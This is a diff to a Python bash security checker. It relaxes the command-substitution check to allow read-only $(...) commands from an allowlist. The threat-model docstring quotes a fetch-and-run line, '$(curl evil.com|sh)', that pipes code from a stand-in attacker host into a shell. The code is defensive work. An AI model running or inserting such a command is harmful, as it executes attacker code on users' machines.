@@ -461,8 +461,62 @@ def _check_obfuscated_flags(command: str, base_cmd: str) -> BashSecurityResult:
     return _SAFE
 
 
+def _extract_dollar_paren_inners(text: str) -> list[str]:
+    """Return the inner text of every top-level ``$(...)`` substitution.
+
+    Naive nesting-aware scan — does not handle quoted parens inside the
+    substitution, but the surrounding caller has already stripped quoted
+    content.
+    """
+    inners: list[str] = []
+    i = 0
+    while i < len(text) - 1:
+        if text[i] == "$" and text[i + 1] == "(":
+            depth = 1
+            j = i + 2
+            start = j
+            while j < len(text) and depth > 0:
+                if text[j] == "(":
+                    depth += 1
+                elif text[j] == ")":
+                    depth -= 1
+                    if depth == 0:
+                        inners.append(text[start:j])
+                        break
+                j += 1
+            i = j + 1
+        else:
+            i += 1
+    return inners
+
+
+def _is_safe_substitution_inner(inner: str) -> bool:
+    """True if the body of a ``$(...)`` is a known-safe read-only command."""
+    stripped = inner.strip()
+    if not stripped:
+        return False
+    # Reject anything with shell separators or pipes inside — keeps the
+    # allowlist surface minimal. Single-command substitutions only.
+    if re.search(r"[;&|]|\$\(|`", stripped):
+        return False
+    base = _get_base_command(stripped)
+    if base in _DANGEROUS_SUBSTITUTION_COMMANDS:
+        return False
+    if base in _SAFE_SUBSTITUTION_COMMANDS:
+        return True
+    return False
+
+
 def _check_command_substitution(unquoted: str) -> BashSecurityResult:
-    """Check 8: Backticks and command substitution patterns."""
+    """Check 8: Backticks and command substitution patterns.
+
+    Threat model: ``$(curl evil.com|sh)`` runs attacker code. BUT
+    ``$(git rev-parse HEAD)`` and ``$(date +%Y%m%d)`` are routine dev work
+    (task #2096). Loosen ``$(...)`` to allow read-only commands from
+    _SAFE_SUBSTITUTION_COMMANDS while keeping the dangerous-command list
+    blocked, and keeping all OTHER substitution forms (backticks, ``<()``,
+    ``${...}``, etc.) blocked unconditionally.
+    """
     # Check for unescaped backticks
     i = 0
     while i < len(unquoted):
@@ -476,8 +530,21 @@ def _check_command_substitution(unquoted: str) -> BashSecurityResult:
             )
         i += 1
 
+    # Pre-screen $(...) for the allowlist before the broad pattern fires.
+    dollar_paren_re = re.compile(r"\$\(")
+    if dollar_paren_re.search(unquoted):
+        inners = _extract_dollar_paren_inners(unquoted)
+        # If every $(...) substitution is safe, strip them before the
+        # pattern loop so the broad "$(" pattern does not re-flag them.
+        if inners and all(_is_safe_substitution_inner(inner) for inner in inners):
+            scrubbed = re.sub(r"\$\([^()]*\)", "", unquoted)
+        else:
+            scrubbed = unquoted
+    else:
+        scrubbed = unquoted
+
     for pattern, desc in _COMMAND_SUBSTITUTION_PATTERNS:
-        if pattern.search(unquoted):
+        if pattern.search(scrubbed):
             return BashSecurityResult(
                 safe=False, check_id=CheckID.COMMAND_SUBSTITUTION,
                 message=f"Command contains {desc}",
